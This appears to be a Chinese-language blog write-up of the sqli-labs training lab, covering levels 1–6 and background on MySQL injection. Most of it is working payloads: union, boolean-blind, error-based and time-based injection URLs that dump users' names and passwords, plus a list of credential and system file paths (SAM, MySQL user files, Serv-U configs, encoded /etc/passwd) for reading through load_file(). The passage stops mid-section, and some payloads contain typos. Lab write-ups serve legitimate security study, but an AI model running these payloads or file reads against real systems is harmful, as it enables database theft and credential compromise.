[{"title":"sqli-labs-writeup","date":"2019-12-27T08:36:20.000Z","path":"2019/12/27/sqli-labs-writeup/","text":"一直想着要刷这边的题目，但是一直没抽出时间来（留下了没技术的泪水）。现在补上。。。本文采用每题有新知识点就写一个知识点 关卡题目下载链接：https://github.com/Audi-1/sqli-labs 配置及解题方法参考Lcamry师傅的Mysql注入天书，线上网址：http://www.cnblogs.com/lcamry/category/846064.html 基础知识sql注入分类基于从服务器接收到的响应 基于错误的sql错误 联合查询的类型 堆查询注射 SQL盲注 基于布尔SQL盲注 基于时间的SQL盲注 基于报错的SQL盲注 基于如何处理输入的SQL查询（数据类型） 基于字符串 基于数字或者整数为基础的 基于程度和顺序的注入 一阶注入 二阶注入 一阶注入是指输入的注入语句对Web直接产生了影响，出现了结果；二阶注入类似存储型xss，是指输入提交的语句，无法直接对Web应用程序产生影响，通过其他的辅助间接的对Web产生危害。 基于注入点的位置上的 通过用户填入的表单域的注入 通过cookie注入 通过服务器变量注入（头部信息） 常用知识点常用函数：12345version()--数据库版本user()--数据库用户名database()--数据库名@@datadir--数据库路径@@version_compile_os--操作系统版本 字符串连接函数1234contact(str1,str2,...)--没有分隔符的连接字符串contact_ws(separator,str1,str2,...)--含有分隔符的连接字符串group_concat(str1,str2,...)--连接这一组的所有字符串，并以逗号隔开每一条数据#三条都可以一次性查出所有信息 一般的尝试性语句1234567or 1=1 -- +'or 1=1 -- +\"or 1=1 -- +)or 1=1 -- +')or 1=1 -- +\")or 1=1 -- +\"))or 1=1 -- + 一般代码为： 即： 12$id=$_GET['id'];$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; 此处考虑两个地方，一个是闭合前面的 &#39;,另一个是为了处理后面的&#39;,有两种思路，闭合后面的引号或者直接-- +或者#(%23)注释掉 union查询union查询用于合并两个及以上select语句的结果集（union内部的select语句必须要有相同数量的列，列也必须要有相似的数据类型且每条select语句中的列的顺序也要相同）。 sql union语法1select column_name(s) from table_name1 union select column_name(s) from table_name2 默认情况下，union选取的是不同的值，如果要允许重复的值，要使用union all sql union all语法1select column_name(s) from table_name1 union all select column_name(s) from table_name2 union查询结果中，列名为union中的第一个列名 sqli-labsBasic基础注入less1题目链接：http://localhost/sqli-labs-master/Less-1/ 进入页面，看见下面这句话： 1Please input the ID as parameter with numeric value 我们在页面中没有看见输入框，应该可以猜测或者你看源码可知道通过构造playload用GET或者POST方式进行注入，向这题，我们打开源码就可以看到是通过GET方式获取的数据 于是构造playload：http://localhost/sqli-labs-master/Less-1/?id=1 得到： 12Your Login name:DumbYour Password:Dumb 没有报错出现了一个用户名，在 1 后面添加单引号，即 1&#39; 发现报错： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 主要的错误点在于&#39;1&#39;&#39; LIMIT 0,1 中添加了一个&#39;,这种方式就是从错误信息中得到我们想要的信息，接下来我们就是要解决这个问题，方法就是在后面添加-- +将后面的内容直接注释掉,于是在后台发送的查询命令就会变为：select **** where id=&#39;1&#39; or 1=1 -- +&#39;LIMIT 0,1 发现没有报错了，尝试order by查询数据库的列数，order by 是对前面的查询数据进行排序。构造http://localhost/sqli-labs-master/Less-1/?id=1&#39; order by 1 -- + 当尝试到4时发现开始报错，这说明在这里只有三列的数据 爆出列数，接下来就是用union select进行联合查询，爆出数据库、表、列名： 12345http://localhost/sqli-labs-master/Less-1/?id=1' union select 1,2,3 -- +http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_contact(schema_name) from information_schema.schemata-- + //获得数据库名security//这边有一个疑问，%23在url编码中是#，如果直接在url输入#不会被编码，以至于会报错，我还没了解到原因然后我改成了-- + 进行注释后面的内容http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_contact(table_name) from information_schema.tables where table_schema= 'security'-- + //获得列表名 userhttp://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name= 'users'-- + //获得列名id,username,password 由此我们已经可以获取到用户信息了 1http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,username,password from users where id=3 -- + 造成注入的原因分析： 从源码我们得知，sql查询的语句为：select * from users where id = &#39;$id&#39; LIMIT 0,1当服务器获取到被传送的id时直接就放入查询语句进行查询，并没进行id参数过滤，所以当提交or 1=1 -- +就会直接构造sql查询语句select * from users where id=&#39;1&#39; or 1=1 -- + LIMIT 0,1这条查询语句中，or 1=1永远都为真。 当id的数据不存在数据库中时，我们可以使用id=-1,两个sql语句进行联合操作时，当前一个语句为空，就将后面的语句的内容显示出来了，此时前台页面返回的是我们构造的union查询数据。 less2进入界面，获得一句话 1Please input the ID as parameter with numeric value 跟less1是一样的，那就先按照less1的步骤来， 构造playload 12http://localhost/sqli-labs-master/Less-2/?id=1 //没有报错http://localhost/sqli-labs-master/Less-2/?id=1' //报错 //报错的信息为： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1 发现和less1的代码有些不太一样，错误提示为&#39;LIMIT 0,1是因为奇数个单引号出发了异常的抛出。 所以在这使用的查询语句应该是： 1select * from table where id=(some integer value) 所以跟less1是不同的注入方式，尝试不用单引号闭合，而是使用数字进行查询： 123456789http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -- +//正常http://localhost/sqli-labs-master/Less-2/?id=1 order by 1-- + //正常http://localhost/sqli-labs-master/Less-2/?id=1 order by 2-- + //正常http://localhost/sqli-labs-master/Less-2/?id=1 order by 3-- + //正常http://localhost/sqli-labs-master/Less-2/?id=1 order by 4-- + //报错http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata -- + //爆出数据库名'security'http://localhost/sqli-labs-master/Less-2/?id=-1%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27%20--%20+ //获得表名'users'http://localhost/sqli-labs-master/Less-2/?id=-1%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27%20--%20+ //获得列名 id username passwordhttp://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,username,password from users where id=3-- + //获得数据 我们查看源码，发现在后台我们发送给数据库查询的代码如下 1$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; 发现是没有对id进行处理。所以和less1中就是相差一个单引号，只需要将less1中的playload的&#39;删除就行。 less3进入界面仍然是那句话 1Please input the ID as parameter with numeric value 按照less1的方法继续注入 12http://localhost/sqli-labs-master/Less-3/?id=1http://localhost/sqli-labs-master/Less-3/?id=1' //报错 此时返回的报错信息为： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1 显然跟上面两个都是一样的，主要的信息为&#39;1&#39;&#39;) LIMIT 0,1 所以查询语句中，应该还有括号没有进行闭合，推出查询语句应该是： 1select * from table from where id=('our input here') 所以我们要进行括号的闭合采用?id=1&#39;) -- +进行注入 然后跟less1注入方式相同，只需在&#39;后面增加)就行，下面是各playload 12345678http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 1 -- +http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 2 -- +http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 3 -- +http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 4 -- +//报错http://127.0.0.1/sqli-labs-master/Less-3/?id=-1') union select 1,group_concat(schema_name),3 from information_schema.schemata -- +//爆库名http://127.0.0.1/sqli-labs-master/Less-3/?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- +//爆表名http://127.0.0.1/sqli-labs-master/Less-3/?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' -- +//爆列名http://127.0.0.1/sqli-labs-master/Less-3/?id=-1') union select 1,username,password from users where id=3 -- +//获取数据 less4less4界面与前面的一致，进行尝试性的注入： 1234567http://localhost/sqli-labs-master/Less-4/?id=1 //正常返回http://localhost/sqli-labs-master/Less-4/?id=1' //正常返回http://localhost/sqli-labs-master/Less-4/?id=1' order by 1 -- + //正常http://localhost/sqli-labs-master/Less-4/?id=1' order by 2 -- + //正常http://localhost/sqli-labs-master/Less-4/?id=1' order by 3 -- + //正常http://localhost/sqli-labs-master/Less-4/?id=1' order by 4 -- + //正常http://localhost/sqli-labs-master/Less-4/?id=1' order by 5 -- + //正常 此时我们要注意，我们测试列数到了5还是返回正常，可以尝试一个比较大的数字，发现还是返回正常，说明我们在想法上发生了错误，我们可以在页面的标题中获知double quotes是双引号于是我们将上面的单引号改为双引号进行尝试 1http://localhost/sqli-labs-master/Less-4/?id=1\" 此时我们就获取到错误信息： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"1\"\") LIMIT 0,1' at line 1 由此我们可以获知主要的错误在于&quot;1&quot;&quot;)所以代码中对传输的id进行进行&quot;&quot;和()包装，所以在注入是需要进行双引号和括号的闭合。 123456789http://localhost/sqli-labs-master/Less-4/?id=1\") -- + //返回正常http://localhost/sqli-labs-master/Less-4/?id=1\") order by 1 -- + //返回正常http://localhost/sqli-labs-master/Less-4/?id=1\") order by 2 -- + //返回正常http://localhost/sqli-labs-master/Less-4/?id=1\") order by 3 -- + //返回正常http://localhost/sqli-labs-master/Less-4/?id=1\") order by 4 -- + //返回错误 //获得列数为3http://localhost/sqli-labs-master/Less-4/?id=-1\") union select 1,group_concat(schema_name),3 from information_schema.schemata -- + //获取到数据库名securityhttp://localhost/sqli-labs-master/Less-4/?id=-1\") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- + //获取表名 usershttp://localhost/sqli-labs-master/Less-4/?id=-1\") union select 1,group_concat(column_name) from information_schema.columns where table_name='users' -- + //获取列名id username passwordhttp://127.0.0.1/sqli-labs-master/Less-4/?id=-1\") union select 1,username,password from users where id=3 -- +//获取数据 盲注盲注就是在sql注入过程中，sql查询语句执行的选择后，选择的数据无法显示在前端的页面，需要利用一些方法进行判断或者尝试。而盲注一般分为三类： 基于布尔SQL盲注 基于时间的SQL盲注 基于报错的SQL盲注 基于布尔sql盲注——通过构造逻辑判断截取字符串的相关函数：参考博文：https://www.cnblogs.com/lcamry/p/5504374.html mid（column_name,start[,length]）函数 参数 描述 column_name 必需字段，需要提取字符的字段 start 必需字段，规定开始截取位置（起始值为1） length 12可选字段，要返回的字符数，若省略，则mid（）函数返回剩余文本 例如:str=“123456” mid(str,2,1) 输出结果为2 mysql中得应用例子： 12341.select username,userGender from user where mid(userGender,1,1)='w';//查询user表中userGender列中第一个字母为W得username，userGender列信息2.select mid（‘chinesepeople’,5,3) as mid;//查询chinesepeople字符串中第5个开始第7个结束得字符 substr()函数 subsr()和substring()函数的功能一样，均可截断字符串。用法： string substring(string,start,length) string substr(string,start,length) 参数与mid()函数是一样的。 应用例子： 121.select substr(database(),1,1);2.select substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1);此处string参数可以为sql语句，可自行构造sql语句进行注入。 left()函数 left()得到字符串左部指定个数得字符，用法： left(string，n) 参数string为要截取得字符串，n为长度 应用例子： 1select left(database(),1); ascii()函数 该函数主要得用处为将某个字符转换为其ASCII值 ord()函数 该函数用处与ascii()函数一样，都是将某个字符转换为ASCII值 regexp正则注入 在mysql5+种information_schema库中存储了所有的库名，表明以及字段名信息。所以可以通过以下攻击方式进行读取这些信息。 参考博客：http://www.cnblogs.com/lcamry/articles/5717442.html 1.判断第一个表名的第一个字符是否是a-z中的字符，其中blind-sqli是假设已知的库名。 注：正则表达式中^[a-z]表示字符串是在a-z范围内 1index.php?id=1 and 1=(select 1 from information_schema.tables where table_schema=\"blind_sqli\" and table_name regexp '^[a-z]' limit 0,1)/* 2.判断第一个字符是否是a-n中的字符 1index.php?id=1 and 1=(select 1 from information_schema.tables where table_schema=\"blind_sqli\" and table_name regexp '^[a-n]' limit 0,1)/* 3.确定该字符n 1index.php?id=1 and 1=(select 1 from information_schema.tables where table_schema=\"blind-sqli\" and table_name regexp '^n' limit 0,1)/* 4.表达式的更换如下 1expression like this: '^n[a-z]'-&gt;'^ne[a-z]'-&gt;'^new[a-z]'-&gt;'^news[a-z]'-&gt;false 此时说明表名为news，要验证是否该表名正则表达式为‘^news$’ 或者直接判断table_name=’news’ 5.猜解其他表名 regexp匹配的时候会在所有的项都进行匹配。例如： security数据库的表有多个，users,email等，则 12345select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^u[a-z]' limit 0,1); //正确select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1); // 正确select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^em[a-z]' limit 0,1); //正确select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 1,1); // 错误select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^em[a-z]' limit 1,1); //错误 以上可以说明，在limit 0，1下，regexp会匹配所有的项，我们在使用regexp时，要注意有可能有多个项，同时要一个个字符去爆破。类似于上述第一条和第二条。此时limit 0，1是对于where table_schema=’security’已经起到限定作用，limit有没有不重要。 上面的内容简单的说，正则注入的用法为：select user() regexp ‘^[a-z]’; 也就是正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。第二位可以用select user() regexp ‘^ro’来进行。 测试结果如图 当结果显示为1时说明是正确的，显示为0则为不正确 like匹配注入 在mysql中还可以使用like进行匹配 1select user() like 'ro%'; 测试结果如图： 基于报错的sql盲注–构造playload让信息通过错误提示回显出来方式一： 1select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2) a from information_schema.columns group by a; 此处有三个关键点： 需要concat计数 floor，取得0 or 1，进行数据的重复 group by进行分组 其中具体的原理不是很了解，大致的原理为分组后数据计数时重复造成的错误，也有解释为mysql的bug问题，但是此处需要将rand(0)，rand()需要多尝试几次 以上语句可以简化为 1select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2)) 如果关键表被禁用了，则可简化为 1select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2)) 如果rand被禁用，则使用用户变量进行报错 1select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2) 方式二： select exp(~(select * from(select user())a)) //double数值类型超出范围 参考博文：https://www.cnblogs.com/lcamry/articles/5509124.html mysql版本需要为5.5.5以上 exp()是以e为底的对数函e数，在mysql中expch传递一个大于709的值时，函数就会发生一个溢出错误。当涉及到注入的时候，就可以使用否定查询造成“double value is out of range”的错误，具体方式是通过子查询与按位求反，造成oudouble overflow error，并且借由此注出数据。例如： 1select exp(~（select * from （select user())x)); 我在phpstudy上进行测试的时候发现不像参考博客内一样可以直接注出用户名，博客中能注出是这样的 1234&gt;`exp(~(select*from(select user())x))` mysql&gt; select exp(~(select*from(select user())x)); ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))' 并且参考在博客中可以注出表名等数据如下方式： 123456得到表名：select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));得到列名：select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));检索数据：select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)); 目前还在找本地测试为什么不行的原因。后面根据博客http://www.creatapd.com/%E7%BB%86%E8%B0%88mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/得知在mysql&gt;5.5.53后exp报错不能返回结果。接着调低mysql版本进行测试。 select !(select * from(select user())x) - ~0 利用bigint溢出报错所进行的注入，bigint超出范围，~0是对0逐位取反，需要在5.5.5版本之后才能使用 参考博客:https://www.cnblogs.com/lcamry/articles/5509112.html 其主要的注入方式为利用子查询引起BITINT溢出，从而设法提取数据。在mysql中如果一个查询成功返回，其返回值为0，所以对其进行逻辑非就会变成1 例如，对（select * from (select user())x);进行逻辑非查询 12select (select * from (select user())x);select !(select * from (select user())x); 1select ~0+!(select * from (select user())x); 跟exp报错注入一样，mysql版本需要控制在5.5.5的版本，使用5.5.53版本进行测试会无法得到相应的结果。且在网页浏览器中“+”会被解析转换为空白符，但是可用%2b进行表示“+”，相反也可使用减法进行。同一种的注入方式会有不同的变种。 利用基于bigint溢出错误的注入手法，可以使用mysql所有的数学函数，只要是他们可以进行取反操作。例如： 123select !atan((select * from (select user())a))-~0; select !ceil((select * from (select user())a))-~0;select !floor((select * from(select user())a))-~0; 比较常用的函数为： 1234567891011HEXINFLOORCEILRANDCEILINGTRUNCATETANSQRTROUNDSIGN 其提取数据的方法与其他注入攻击手法是一致的，例如： 获取表名： 1!(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0 取得列名： 1select !(select * from (select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0; 检索数据： 1!(select * from (select concat_ws(':',id, username, password) from users limit 0,1)x)-~0; 利用插入语句进行注入： 具体的语法为：‘’ or (payload) or “” 例如： 12mysql&gt; insert into users (id, username, password) values (2, '' or !(select * from (select user())x)-~0 or '', 'Eyre');ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))' 使用DIOS查询： 12345insert into users (id, username, password) values (2, '' or !(select * from (select(concat(@:=0,(select count(*) from `information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0 or '', 'Eyre');ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000newdb::users::idnewdb::users::usernamenewdb::users::password' from dual))) - ~(0))' 利用更新语句进行注入 12mysql&gt; update users set password='Peter' or !(select*from(select user())x)-~0 or '' where id=4;ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))' 利用删除语句进行注入 12mysql&gt; delete from users where id='1' or !(select*from(select user())x)-~0 or '';ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))' extractvalue (1,concat(0x7e,(select @@version),0x7e)) se mysql对xml数据进行查询和修改的xpath函数，xpath语法错误 *updatexml (1,concat(0x7e,(select @@verdion),0x7e),1) * mysql对xml数据进行查询和修改的xpath函数，xpath语法错误 select * from （select NAME_CONST(version(),1),NAME_CONST（version(),1))x; 通过mysql重复的特性，重复使用version函数造成报错。 基于时间的SQL盲注–延时注入if （ascii (substr(database(),1,1))&gt;115,0,sleep(5))%23 这是一句if判断语句，若条件为假则执行sleep，在实际渗透的过程中，因时间会有网速等其他影响因素，不可使用以下方法： 1select sleep(find_in_set(mid)@@version,1,1), '0,1,2,3,4,5,6,7,8,9,.'; 这句话意思是在0-9之间找版本号的第一位。 union select if(substring(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’ by 5 seconds’ )),null) from (select database() as current) as tb1; benchmark(current,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时的要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。 less5题目界面仍旧 1Please input the ID as parameter with numeric value 按照前面题目的方法，直接在playload中键入？id=1得到不是相应的id=1的用户信息，得到的是You are in………..。此时查看下源码 查询结果存在时显示的不是查询返回的结果，而是直接返回You are in……….. (1)利用left（database(),1)进行尝试 1http://localhost/sqli-labs-master/Less-5/?id=1' and left(version(),1)=5 -- + 通过上述的playload判断数据库的版本号的第一位是否为5，若返回结果正确时则显示You are in………..，在mysql上进行查询版本号进行验证，发现是5.5.53，当页面没有显示的时候说明版本号是不正确的。 然后再查看数据库的长度 1http://localhost/sqli-labs-master/Less-5/?id=1' and length(database())=8 -- + 当长度为8时，返回正确的结果，说明长度为8 猜测数据库的第一位 1http://localhost/sqli-labs-master/Less-5/?id=1' and left(database(),1)&gt;'a' -- + 由于我们事先知道Database()为security，所以看起第一位是否&gt;a,因为s&gt;a所以返回是正确的，如果事先不知道的情况下使用二分法进行尝试会提高效率。 猜测数据库第二位，得知第一位为s，看前两位是否会大于sa 1http://localhost/sqli-labs-master/Less-5/?id=1' and left(database(),2)&gt;'sa' -- + 往后就是类似的进行猜测，以至于将八位全部猜出来。 (2)利用substr() ascii()函数进行注入 1ascii(substr(select table_name info rmation_schema.tables where table_schema=database() limit 0,1),1,1))=101 根据以上得知数据库名为security，那我们利用此方式获取security数据库下的表。获取security数据库的第一个表的第一个字符 1http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from infromation_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80 -- + 此处的table_schema可以为security，如果database()只有一个库就可以用database()。此处同样使用二分法进行测试。最终测试结果该表名第一个字符ascii值为101，为email的e。 而获取第一个表的第二个字符，则按照substr()函数的特性，将其改为sub(**,2,1)即可 1http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108 -- + 获知第一个表的第二个字符ascii码值为109 以此类推就可将第一个表中的所有字符。 上述playload中limit 0，1意思是从第0个开始获取第1个表，获取第二个则是limit 1，1 1http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;113 -- + 此处返回，因为第二个表名为referers，第一位为r 通过上述的全部过程就可以将security库中的表全部注入出来。 (3)利用regexp获取（2）中的users表中的列 //正则匹配 1http://localhost/sqli-labs-master/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)-- + 这可以选择users表中的列名是否有us**的列，测试users表中的us**列的 第三个字符是否在a-z范围内。 1http://localhost/sqli-labs-master/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^username' limit 0,1) -- + 图片说明username列是存在的，同样可以将username换成password等其他项也会是正确的。 (4)利用ord()和mid()函数获取users表的内容 1http://localhost/sqli-labs-master/Less-5/?id=1' and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68 -- + 该playload可以获取到users表中的内容，获取username中的第一行的第一个字符的ascii，与68进行比较，即为D。而我们从表中得知第一行数据为Dumb。 (5)使用报错注入 1http://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a -- + 利用double数值类型超出范围进行报错注入 1http://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * from (select user())a))),2,3 -- + 此时要注意mysql版本是否是5.5.5-5.5.52之间的，超出这个范围是无法得到想要的结果。 利用bigint溢出进行报错注入 1http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select user())x) - ~0),2,3 -- + xpath函数报错注入 1http://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e)) -- + 1http://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)-- + 利用数据的重复性 1http://localhost/sqli-labs-master/Less-5/?id=1' union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x -- + (6)延时注入 利用sleep()函数进行注入 1http://localhost/sqli-labs-master/Less-5/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5))-- + 如果查询语句是对的，则会直接显示 如果查询语句判断为错误时会有5秒的延时 利用BENCHMARK()进行延时注入 1http://localhost/sqli-labs-master/Less-5/?id=1' union select (if (substring(current,1,1)=char(115),benchmark(50000000,encode('MSG','by 5 seconds')),null)),2,3 from (select database() as current) as tb1 -- + 当结果正确的时候，运作encode（’MSG’,’by 5 seconds’)操作50000000次，会占用一段时间。 less6less6传入参数的部分源码 12$id = '\"'.$id.'\"';$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; 与less5比较发现区别在与less6中对id参数传输到服务器时进行了处理，将id增加双引号传输，知道这个就可以将less5中id参数的单引号直接改为双引号 1http://localhost/sqli-labs-master/Less-6/?id=1\" and left(version(),1)=5 -- + 所有的注入过程与less5一致，只要将id的单引号改为双引号即可 123456789http://localhost/sqli-labs-master/Less-6/?id=1\" and length(database())=8 -- + //数据库长度http://localhost/sqli-labs-master/Less-6/?id=1\" and left(database(),1)&gt;'s' //猜测数据库名第1位http://localhost/sqli-labs-master/Less-6/?id=1\" and left(database(),2)&gt;'se' //猜测数据库名第2位......http://localhost/sqli-labs-master/Less-6/?id=1\" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80 -- + //猜测数据库security下的第一个表的第一个字符http://localhost/sqli-labs-master/Less-6/?id=1\" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108 -- + //猜测数据库security下的第一个表的第一个字符http://localhost/sqli-labs-master/Less-6/?id=1\" and ascii (substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;113 -- + //猜测数据库security下第二个表的第一个字符http://localhost/sqli-labs-master/Less-6/?id=1\" and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1) -- + //查看users表中的是否有us**的列，并且该列名第三个字符是否在a-z范围内http://localhost/sqli-labs-master/Less-6/?id=1\" and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68 -- + //获取users表中第一行的第一个字符的ascii并与68进行比较即为D Background-3 导入与导出相关操作load_file()导出文件load_file(file_name):读取文件并返回该文件的内容作为一个字符串。 使用条件： 必须有权限读取并且文件必须完全可读，测试查询语句： and (select count(*) from mysql.user)&gt;0 //如果返回正常，说明具有读写权限 and (select count(*) from mysql.user)&gt;0 //返回错误，应该是管理员对数据库账户降权 欲读取文件必须在服务器上 必须指定文件完整的路径 欲读取文件必须小于 max_allowed_packet 如果该文件不存在或因为上面的任意一种原因而不能被读取，函数返回为空。其中比较难满足的是权限，在win下，如果NTFS设置得当，是不能读取相关的文件，只有administrators才能访问的文件。 实际注入中，主要要解决两个难点 绝对物理路径 构造有效的畸形语句（报错爆出绝对路径） 常用的路径 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748WINDOWS下:c:/boot.ini //查看系统版本c:/windows/php.ini //php配置信息c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码c:/winnt/php.inic:/winnt/my.inic:\\mysql\\data\\mysql\\user.MYD //存储了mysql.user表中的数据库连接密码c:\\Program Files\\RhinoSoft.com\\Serv-U\\ServUDaemon.ini //存储了虚拟主机网站路径和密码c:\\Program Files\\Serv-U\\ServUDaemon.inic:\\windows\\system32\\inetsrv\\MetaBase.xml 查看IIS的虚拟主机配置c:\\windows\\repair\\sam //存储了WINDOWS系统初次安装的密码c:\\Program Files\\ Serv-U\\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此c:\\Program Files\\RhinoSoft.com\\ServUDaemon.exeC:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\*.cif文件//存储了pcAnywhere的登陆密码c:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf 或C:\\apache\\conf\\httpd.conf //查看WINDOWS系统apache文件c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机d:\\APACHE\\Apache2\\conf\\httpd.confC:\\Program Files\\mysql\\my.iniC:\\mysql\\data\\mysql\\user.MYD 存在MYSQL系统中的用户密码LUNIX/UNIX 下:/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件/usr/local/apache2/conf/httpd.conf/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/usr/local/app/php5/lib/php.ini //PHP相关设置/etc/sysconfig/iptables //从中得到防火墙规则策略/etc/httpd/conf/httpd.conf // apache配置文件/etc/rsyncd.conf //同步程序配置文件/etc/my.cnf //mysql的配置文件/etc/redhat-release //系统版本/etc/issue/etc/issue.net/usr/local/app/php5/lib/php.ini //PHP相关设置/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看/usr/local/resin-pro-3.0.22/conf/resin.conf 同上/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看/usr/local/resin-pro-3.0.22/conf/resin.conf 同上/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看/etc/sysconfig/iptables 查看防火墙策略load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录replace(load_file(0×2F6574632F706173737764),0×3c,0×20)replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32)) 例如： 1select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))) 利用hex()将文件内容导出，尤其是smb文件时可以使用 123456-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))//char(99,58,47,98,111,111,116,46,105,110,105)就是c:/boot.ini的ASCII代码-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69) //“c:/boot.ini” 的 16 进制是“0x633a2f626f6f742e696e69”-1 union select 1,1,1,load_file(c:\\\\boot.ini)//路径内的/用\\\\代替 文件导入到数据库LOAD DATA INFILE 